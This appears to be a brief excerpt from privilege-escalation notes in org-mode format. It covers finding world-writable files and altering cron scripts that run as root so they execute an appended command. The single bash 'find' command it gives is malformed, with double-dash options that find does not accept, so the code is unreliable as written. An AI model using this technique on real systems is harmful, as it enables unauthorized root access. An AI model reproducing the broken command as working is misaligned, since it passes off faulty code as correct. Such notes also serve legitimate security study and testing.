readme.org
** *Writeable Files*
Are any scripts or configuration files world-writable? While altering configuration files can be extremely destructive, there may be instances where a minor modification can open up further access. Also, any scripts that are run as root using cron jobs can be modified slightly to append a command.
#+BEGIN_SRC bash
find / -path /proc --prune --o --type f --perm --o+w 2>/dev/null
#+END_SRC
* Information Gathering
